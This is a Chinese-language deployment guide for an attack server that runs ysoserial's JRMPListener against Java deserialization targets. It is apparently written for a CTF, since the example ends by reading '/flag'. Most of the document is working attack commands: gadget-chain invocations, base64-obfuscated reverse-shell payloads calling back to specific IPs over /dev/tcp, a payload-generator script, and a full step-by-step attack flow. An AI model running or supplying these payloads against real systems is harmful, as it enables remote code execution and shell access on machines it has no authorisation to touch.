# VPS 端部署指南

## 🚀 快速部署

### 方法 1: 一键脚本 (推荐)

```bash
# 1. 上传脚本到 VPS
scp vps_setup.sh root@YOUR_VPS_IP:~/

# 2. 登录 VPS
ssh root@YOUR_VPS_IP

# 3. 运行脚本
chmod +x vps_setup.sh
./vps_setup.sh

# 脚本会自动:
# - 安装 Java
# - 下载 ysoserial
# - 配置防火墙
# - 启动 JRMPListener
```

---

### 方法 2: 手动部署

#### Step 1: 安装 Java

**CentOS/RHEL:**
```bash
yum install -y java-11-openjdk java-11-openjdk-devel
```

**Ubuntu/Debian:**
```bash
apt-get update
apt-get install -y openjdk-11-jdk
```

**验证安装:**
```bash
java -version
# 应该输出 Java 版本信息
```

#### Step 2: 上传 ysoserial.jar

**方法 A: 从本地上传**
```bash
# 在本地执行
scp ysoserial.jar root@YOUR_VPS_IP:~/
```

**方法 B: 在 VPS 上下载**
```bash
# 在 VPS 上执行
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -O ysoserial.jar
```

**方法 C: 备用下载地址**
```bash
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar
```

#### Step 3: 配置防火墙

**firewalld (CentOS 7+):**
```bash
firewall-cmd --zone=public --add-port=1099/tcp --permanent
firewall-cmd --reload
```

**ufw (Ubuntu):**
```bash
ufw allow 1099/tcp
```

**iptables:**
```bash
iptables -A INPUT -p tcp --dport 1099 -j ACCEPT
```

**阿里云/腾讯云/AWS:**
- 登录控制台
- 找到安全组设置
- 添加入站规则: TCP 1099

#### Step 4: 启动 JRMPListener

```bash
# 基础命令执行
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'

# 反弹 shell (推荐)
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==}|{base64,-d}|{bash,-i}'

# 替换 YOUR_IP/PORT 为你的监听地址
```

---

## 🎯 可用的 Gadget 选项

### 1. Jdk7u21 (无依赖) ⭐⭐⭐⭐⭐
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
```
- ✅ 不需要任何外部依赖
- ⚠️ 需要目标 JDK <= 7u21
- 📝 推荐作为第一选择

### 2. CommonsCollections6 (需要 CC 库)
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'whoami'
```
- ⚠️ 需要目标有 commons-collections 3.x
- ✅ 最稳定的 CC 链

### 3. URLDNS (仅测试)
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 URLDNS 'http://dnslog.cn'
```
- ✅ 仅用于测试连接性
- ❌ 无法执行命令

---

## 🔧 常见问题

### Q1: java: command not found

**原因**: 未安装 Java

**解决**:
```bash
# CentOS
yum install -y java-11-openjdk

# Ubuntu
apt-get install -y openjdk-11-jdk
```

### Q2: Address already in use

**原因**: 端口被占用

**解决**:
```bash
# 查看占用进程
netstat -tuln | grep 1099

# 更换端口
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2099 Jdk7u21 'whoami'
```

### Q3: 防火墙拦截

**症状**: 本地攻击脚本提示连接超时

**检查**:
```bash
# 检查防火墙状态
systemctl status firewalld  # CentOS
ufw status                   # Ubuntu

# 临时关闭防火墙测试
systemctl stop firewalld     # CentOS
ufw disable                  # Ubuntu
```

### Q4: 云服务器安全组

**阿里云/腾讯云**:
1. 登录控制台
2. 找到 ECS 实例
3. 配置安全组
4. 添加规则: TCP 1099 0.0.0.0/0

### Q5: 监听器没有收到连接

**可能原因**:
1. 目标服务器无法连接外网
2. IP/端口填写错误
3. 防火墙拦截
4. 网络不通

**测试连接性**:
```bash
# 在本地测试 VPS 连通性
nc -zv YOUR_VPS_IP 1099

# 或
telnet YOUR_VPS_IP 1099
```

---

## 📝 完整攻击流程示例

### 场景: 反弹 shell

**Step 1: 在 VPS 1 上监听反弹 shell**
```bash
# VPS 1 (116.62.211.91:4445)
nc -lvnp 4445
```

**Step 2: 在 VPS 2 上启动 JRMPListener**
```bash
# VPS 2 (139.196.185.10:1099)
# 反弹到 VPS 1

# 生成 Base64 编码的反弹命令
echo 'bash -i >& /dev/tcp/116.62.211.91/4445 0>&1' | base64
# 输出: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMjExLjkxLzQ0NDUgMD4mMQ==

# 启动监听器
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMjExLjkxLzQ0NDUgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

**Step 3: 在本地执行攻击**
```bash
# 本地
python exp_jrmp.py

# 输入:
# VPS IP: 139.196.185.10
# 端口: 1099
# 命令: (在 VPS 2 配置)
```

**Step 4: 查看 VPS 1 是否收到 shell**
```bash
# VPS 1 应该收到反弹 shell
id
whoami
cat /flag
```

---

## 🎁 实用命令模板

### 反弹 shell 命令生成器

```bash
#!/bin/bash
# 在本地运行生成 payload

VPS_IP="116.62.211.91"
VPS_PORT="4445"

# 生成反弹命令
SHELL_CMD="bash -i >& /dev/tcp/${VPS_IP}/${VPS_PORT} 0>&1"
SHELL_B64=$(echo -n "$SHELL_CMD" | base64)

echo "[+] 反弹 shell payload:"
echo "bash -c {echo,${SHELL_B64}}|{base64,-d}|{bash,-i}"
echo
echo "[+] 在 VPS 上执行:"
echo "java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'bash -c {echo,${SHELL_B64}}|{base64,-d}|{bash,-i}'"
```

### 后台运行监听器

```bash
# 使用 nohup 后台运行
nohup java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami' > jrmp.log 2>&1 &

# 查看进程
ps aux | grep JRMPListener

# 查看日志
tail -f jrmp.log

# 停止
pkill -f JRMPListener
```

### 使用 screen 管理会话

```bash
# 安装 screen
yum install -y screen  # CentOS
apt-get install -y screen  # Ubuntu

# 创建 screen 会话
screen -S jrmp

# 启动监听器
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'

# 断开会话: Ctrl+A+D

# 重新连接
screen -r jrmp

# 列出所有会话
screen -ls
```

---

## 📊 监控与调试

### 查看连接日志

```bash
# 实时监控端口连接
watch -n 1 "netstat -ant | grep 1099"

# 查看 TCP 连接
ss -ant | grep 1099

# tcpdump 抓包
tcpdump -i eth0 -nn port 1099
```

### 启用详细日志

```bash
# 添加 Java 调试参数
java -Djava.rmi.server.logCalls=true \
     -Dsun.rmi.server.logLevel=VERBOSE \
     -cp ysoserial.jar \
     ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
```

---

## 🔗 相关资源

- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [JRMPClient 利用原理](https://www.anquanke.com/post/id/192619)
- [Java RMI 攻击详解](https://xz.aliyun.com/t/7079)
